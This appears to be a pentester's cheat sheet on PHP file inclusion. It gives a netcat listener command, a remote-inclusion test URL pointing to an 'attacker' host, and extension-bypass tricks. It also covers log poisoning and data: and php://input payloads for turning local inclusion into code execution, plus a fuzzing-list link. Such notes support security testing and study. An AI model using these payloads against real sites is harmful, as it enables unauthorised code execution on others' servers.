# File Inclusion

## Test for RFI

Setting up listener:

```
$ sudo nc -nlvp 80
```

Testing for RFI:

```
http://victim/page.php?file=http://attacker/test.txt
```

Check if Netcat listener caught a request.

## Bypass File Extensions

* Null byte (%00), for older PHP versions
* Question mark (?), for RFI

## LFI: Contaminating Log File To Get Command Exec

* Inject payload (command execution) in log file
* Exploit LFI by calling the log file

## LFI to RCE Notes

```
?language=data:text/plain,<?php phpinfo(); ?>

<form id="rce" method="post" action="?language=php://input" enctype="text/plain">
	<input name="rce" value="<?php phpinfo(); ?>" type="hidden">
</form>
```

## Fuzzing

[https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
